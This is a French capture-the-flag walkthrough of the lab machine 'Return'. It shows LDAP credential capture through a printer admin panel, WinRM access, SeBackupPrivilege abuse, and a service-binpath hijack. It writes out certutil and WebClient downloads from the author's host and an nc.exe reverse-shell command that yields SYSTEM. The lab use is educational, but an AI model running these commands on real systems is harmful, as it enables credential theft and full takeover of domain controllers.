Return est une machine Windows facile à utiliser, dotée d'un panneau d'administration d'imprimantes réseau qui stocke les informations d'identification LDAP. Ces informations d'identification peuvent être capturées en introduisant un serveur LDAP malveillant qui permet d'avoir le foothold sur le serveur par l'intermédiaire du service WinRM. L'utilisateur fait partie d'un groupe à privilèges qui est ensuite exploité pour obtenir l'accès au système.
## Recon

```
└─# /home/blo/tools/nmapautomate/nmapauto.sh $ip

###############################################
###---------) Starting Quick Scan (---------###
###############################################

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-03 19:04 CST
Initiating Ping Scan at 19:04
Scanning 10.129.95.241 [4 ports]
Completed SYN Stealth Scan at 19:05, 29.31s elapsed (1000 total ports)
Nmap scan report for 10.129.95.241
Host is up (0.60s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 29.82 seconds
           Raw packets sent: 1302 (57.264KB) | Rcvd: 1035 (41.448KB)


----------------------------------------------------------------------------------------------------------                                                                                                
Open Ports : 53,80,88,135,139,389,445,464,593,636,3268,3269                                          
----------------------------------------------------------------------------------------------------------                                                                                                
Not shown: 39799 filtered tcp ports (no-response), 25723 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
53/tcp    open  tcpwrapped
80/tcp    open  tcpwrapped
135/tcp   open  tcpwrapped
139/tcp   open  tcpwrapped
389/tcp   open  tcpwrapped
445/tcp   open  tcpwrapped
3268/tcp  open  tcpwrapped
5985/tcp  open  tcpwrapped
9389/tcp  open  tcpwrapped
49664/tcp open  tcpwrapped
49666/tcp open  tcpwrapped
49678/tcp open  tcpwrapped
49681/tcp open  tcpwrapped

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 325.52 seconds
           Raw packets sent: 454448 (19.996MB) | Rcvd: 38143 (1.526MB)


----------------------------------------------------------------------------------------------------------                                                                                                
Open Ports : 53,80,135,139,389,445,3268,5985,9389,49664,49666,49678,49681                            
----------------------------------------------------------------------------------------------------------                                                                                                

└─# nmap -sC -sV -Pn -p53,80,135,139,389,445,3268,5985,9389,49664,49666,49678,49681,3269,636,464 $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-03 19:12 CST

NSE Timing: About 95.90% done; ETC: 19:13 (0:00:00 remaining)
Nmap scan report for 10.129.95.241
Host is up (0.87s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 18m37s
| smb2-time: 
|   date: 2024-03-04T01:32:45
|_  start_date: N/A




```

En voyant le port `88` j'ai plus de chance d'etre dans un AD

- Un port `80` qui heberge un site internet
- SMB disponible dans les ports `135` `445`
- Le Domain `return.local` et le DC `PRINTER.return.local`

Je visite le site et je vois un site d'imprimante et dans le `settings` j'ai un  username et un mot de passe mais faudrais l'afficher

Dans le server address je trouve `printer.return.local` donc je vais le modifier et mettre mon IP puis j'ouvre un `nc`

```
└─# nc -lnvp 389
listening on [any] 389 ...
connect to [10.10.16.27] from (UNKNOWN) [10.129.95.241] 64714
0*`%return\svc-printer�
                       1edFg43012!!
```
J'ai un user et un mot de passe, essayons voir avec le smb

```
└─# nxc smb $ip -u 'svc-printer' -p '1edFg43012!!' -x "whoami"
SMB         10.129.95.241   445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.129.95.241   445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
```

Alors je vais voir avec le psexec ou le `winrm`

```
└─# nc -nv $ip 5985                                           
(UNKNOWN) [10.129.95.241] 5985 (?) open
```

```
    Directory: C:\Users\svc-printer\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         3/3/2024   5:22 PM             34 user.txt


ty*Evil-WinRM* PS C:\Users\svc-printer\Desktop> type user.txt
b76e02de68e31d70efeabace88768799
```

## Privilege Escalation
Pour l'escalation je vais commencer par checker le `whoami /priv`

```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
```

- **SeBackupPrivilege**(Read Sensitive files) By Uploading Malicious dll


Je vais essayer le SeBackupPrivilege pour escalader les privileges

- https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/
- https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960


```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> certutil -urlcache -split -f http://10.10.16.27/SeBackupPrivilegeUtils.dll SeBackupPrivilegeUtils.dll
****  Online  ****
  0000  ...
  4000
CertUtil: -URLCache command completed successfully.
*Evil-WinRM* PS C:\Users\svc-printer\Documents> Import-Module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Users\svc-printer\Documents> Import-Module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Users\svc-printer\Documents> dir


    Directory: C:\Users\svc-printer\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2024   6:07 PM          12288 SeBackupPrivilegeCmdLets.dll
-a----         3/3/2024   6:07 PM          16384 SeBackupPrivilegeUtils.dll


*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

Maintenant je peux copier des sensitives files ou les lire
```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt C:\Users\svc-printer\Documents\flag.txt -Overwrite
*Evil-WinRM* PS C:\Users\svc-printer\Documents> dir


    Directory: C:\Users\svc-printer\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2024   6:11 PM             34 flag.txt
-a----         3/3/2024   6:07 PM          12288 SeBackupPrivilegeCmdLets.dll
-a----         3/3/2024   6:07 PM          16384 SeBackupPrivilegeUtils.dll


*Evil-WinRM* PS C:\Users\svc-printer\Documents> type flag.txt
4b435ebcb93dcc1446274dd71d13fb67
```

**Second way: Groups**
Ici je vais check les group de cet utilisateur
```
*Evil-WinRM* PS C:\windows\ntds> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
*Evil-WinRM* PS C:\windows\ntds> 


```

Il peut y avoir d'autres groupes intéressants, mais celui des `Opérateurs de serveur` se démarque immédiatement.
Microsoft décrit le groupe des opérateurs de serveur comme une personne capable de créer et de supprimer des ressources partagées sur le réseau, de démarrer et d'arrêter des services, de sauvegarder et de restaurer des fichiers, de formater le disque dur de l'ordinateur.
 Ce groupe peut faire beaucoup de choses :

- Un groupe intégré qui n'existe que sur les contrôleurs de domaine. Par défaut, le groupe n'a pas de membres. Les opérateurs de serveur peuvent se connecter à un serveur de manière interactive, créer et supprimer des partages de réseau, démarrer et arrêter des services, sauvegarder et restaurer des fichiers, formater le disque dur de l'ordinateur et arrêter l'ordinateur. Droits d'utilisateur par défaut : Autorise la connexion locale : `SeInteractiveLogonRight` Sauvegarder des fichiers et des répertoires : `SeBackupPrivilege` Modifier l'heure du système : `SeSystemTimePrivilege` Modifier le fuseau horaire : `SeTimeZonePrivilege` Forcer l'arrêt d'un système distant : `SeRemoteShutdownPrivilege` Restaurer les fichiers et les répertoires `SeRestorePrivilege` Arrêter le système : `SeShutdownPrivilege`

## LPE Modifying Services

Les opérateurs de serveur ont des droits d'écriture sur un grand nombre de services par défaut, que nous pouvons énumérer de la façon suivante

- Pour l'attaquer je vais faire un Reverse Shell, je vais l'abuser avec le `nc64.exe`

- https://cube0x0.github.io/Pocing-Beyond-DA/

```
(new-object System.Net.WebClient).DownloadFile('http://10.10.16.27:5555/nc.exe', 'C:\Users\svc-printer\Documents\nc.exe')



*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config VSS binpath="C:\Users\svc-printer\Documents\nc.exe 10.10.16.27 443 -e cmd.exe"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe stop VSS
[SC] ControlService FAILED 1062:

The service has not been started.

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start VSS

```

Dans mon Listner

```
└─# nc -lnvp 443 
listening on [any] 443 ...
connect to [10.10.16.27] from (UNKNOWN) [10.129.95.241] 62179
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

Un bon ressources : https://cube0x0.github.io/Pocing-Beyond-DA/